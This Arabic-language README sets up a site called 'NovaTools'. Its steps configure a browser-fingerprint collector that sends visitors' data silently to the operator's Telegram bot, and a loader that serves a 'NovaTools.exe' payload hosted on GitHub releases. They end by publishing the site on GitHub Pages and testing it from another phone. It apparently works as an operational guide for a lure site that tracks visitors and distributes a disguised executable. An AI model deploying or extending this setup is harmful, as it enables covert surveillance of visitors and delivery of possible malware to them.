# NovaTools — المنظومة

## 📁 الملفات
| الملف | الوظيفة |
|---|---|
| `index.html` | الصفحة الرئيسية |
| `style.css` | التصميم |
| `collector.js` | جامع بصمات المتصفح |
| `loader.js` | زر التحميل |
| `config.example.js` | نموذج الإعدادات |
| `.gitignore` | حماية |

## 🔐 الخطوات — مهمة جداً

### 1) اعمل Revoke للتوكن القديم
- @BotFather → `/mybots` → البوت → **API Token** → **Revoke**

### 2) خد التوكن الجديد
من @BotFather بعد الـ Revoke.

### 3) خد chat_id
- كلّم **@userinfobot** على تليجرام
- هيبعتلك الـ ID

### 4) حط القيم في مكانين بس:

**في `collector.js`** (أول 3 سطور):
```javascript
const TG_BOT_TOKEN = "التوكن_الجديد";
const TG_CHAT_ID   = "الـ_id_بتاعك";
```

**في `loader.js`** (أول 3 سطور):
```javascript
const PAYLOAD_URL = "رابط_الملف_على_GitHub";
```

> ملاحظة: `loader.js` بيستخدم `TG_BOT_TOKEN` و `TG_CHAT_ID` من `collector.js` — معرفين في نطاق الصفحة.

### 5) ارفع على GitHub

```bash
git init
git add .
git commit -m "init"
git branch -M main
git remote add origin https://github.com/USERNAME/REPO.git
git push -u origin main
```

### 6) شغّل GitHub Pages
- Settings → Pages → Source: **Deploy from a branch**
- Branch: **main** / **root** → Save

### 7) الرابط النهائي
```
https://USERNAME.github.io/REPO/
```

## 🎯 الاختبار
افتح الرابط من موبايل تاني → هيوصلك على تليجرام بصمة كاملة تلقائياً.

## 🔄 تحديث الـ PAYLOAD_URL
1. روح على الريبو → **Releases** → **New release**
2. ارفع `NovaTools.exe`
3. خد الرابط: `https://github.com/USERNAME/REPO/releases/latest/download/NovaTools.exe`
4. حدّثه في `loader.js` وارفع تاني